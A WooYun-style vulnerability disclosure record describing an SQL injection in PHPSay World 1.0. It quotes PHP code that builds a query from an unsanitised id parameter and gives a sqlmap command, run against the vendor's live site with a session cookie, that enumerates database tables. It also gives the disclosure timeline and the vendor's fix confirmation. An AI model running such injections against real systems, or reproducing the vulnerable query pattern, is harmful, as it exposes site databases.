{"id": 56409, "wybug_id": "wooyun-2014-057830", "wybug_title": "PHPSay World 微社区系统 1.0 正式版SQL注射", "wybug_corp": "phpsay.com", "wybug_author": "lxj616", "wybug_date": "2014-05-17 11:08", "wybug_open_date": "2014-08-15 11:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-15：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： PHPSay World 微社区系统 1.0 正式版SQL注射 为4月8日版本，在官网测试成功，源码详细解析 详细说明：  /user.php\n<?phprequire(dirname(__FILE__).\"/global.php\");if ( $loginInfo['uid'] < 1 ){\theader(\"location:./\");}else{\t$postType = ( isset($_GET['list']) && ( $_GET['list'] == \"reply\" || $_GET['list'] == \"favorite\" ) ) ? $_GET['list'] : \"topic\";//下面userId由用户控制\t$userId = ( isset($_GET['id']) &&  trim($_GET['id']) != \"\" ) ? $_GET['id'] : $loginInfo['uid'];\tif( $postType == \"favorite\" && $userId != $loginInfo['uid'] )\t{\t\theader(\"location:./user.php?list=favorite\");\t}\telse\t{\t\t$DB = database();//下面使用userId调用getMemberInfo，看上去is_numeric很安全，但是仔细一看根本不是那么回事，传进去的还是用户控制的$userid\t\t$userInfo = PHPSay::getMemberInfo($DB,is_numeric($userId)?\"uid\":\"nickname\",$userId);//省略以下无关代码\n/controller/class_PHPSay.php\n<?php <?phpclass PHPSay{//之前我们控制了userId，因此$value能够被用户控制\tpublic static function getMemberInfo($DB,$key,$value)\t{\t\t$memberArray = array( \"uid\"=>0, \"nickname\"=>\"\", \"email\"=>\"\", \"password\"=>\"\", \"regtime\"=>\"\", \"qqid\"=>\"\", \"groupid\"=>0 );//这下很明显了，直接带进去查询了\t\t$DBArray = $DB->fetch_one_array(\"SELECT * FROM `phpsay_member` WHERE `\".$key.\"`='\".$value.\"'\"); ?>\n官网测试，需要登录后查看正常\n\n报错\n\n抓自己COOKIE用来SQLMAP\n\n\nC:\\Users\\Administrator>sqlmap.py -u \"www.phpsay.com/user.php?id=2411\" --cookie=\"__utma=218911192.121983058.1397969694.1397969694.1397969694.1; __utmb=218911192.4.10.1397969694; __utmc=218911192; __utmz=218911192.1397969694.1.1.utmcsr=down.chinaz.com|utmccn=(referral)|utmcmd=referral|utmcct=/soft/35832.htm; phpsay_uname=lxj616; phpsay_secure=Hfz003SZDYgWJyMYHptxjzHbBoYuxBYZRkG1s55rwcI%3D\" -p id --tables\n\n\n\n\n   漏洞证明：  抓自己COOKIE用来SQLMAP\n\n\nC:\\Users\\Administrator>sqlmap.py -u \"www.phpsay.com/user.php?id=2411\" --cookie=\"__utma=218911192.121983058.1397969694.1397969694.1397969694.1; __utmb=218911192.4.10.1397969694; __utmc=218911192; __utmz=218911192.1397969694.1.1.utmcsr=down.chinaz.com|utmccn=(referral)|utmcmd=referral|utmcct=/soft/35832.htm; phpsay_uname=lxj616; phpsay_secure=Hfz003SZDYgWJyMYHptxjzHbBoYuxBYZRkG1s55rwcI%3D\" -p id --tables\n\n\n\n\n   修复方案：  加强对参数的过滤，避免注入攻击   版权声明：转载请注明来源 lxj616@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-05-17 22:27 厂商回复： 已修复，感谢！ 最新状态： 2014-05-19：已修复  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}